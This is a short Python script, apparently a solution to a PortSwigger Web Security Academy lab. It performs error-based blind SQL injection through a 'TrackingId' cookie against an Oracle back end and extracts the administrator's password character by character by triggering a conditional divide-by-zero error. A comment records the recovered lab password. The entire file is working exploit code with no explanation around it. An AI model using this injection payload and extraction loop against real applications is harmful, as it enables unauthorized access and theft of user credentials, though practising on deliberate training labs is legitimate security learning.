import requests
import string

url = 'https://ac871f601e7effe9807ad5e0004e008a.web-security-academy.net/filter?category=asdf'

# oracle db
# no error if no rows returned
# first find length of password
# pwd: uney5hpoi974385dhpdp

pwd = ''

for j in range(1,50):
    for i in string.printable:
        cookies = {'TrackingId':"xyz' union select case when (username='administrator' and substr(password,1,"+str(j)+") = '"+(pwd+i)+"') then to_char(1/0) else null end from users--"}
        response = requests.get(url,cookies=cookies)
        if 'Error' in response.text:
            pwd += i
            print(pwd)
            break;

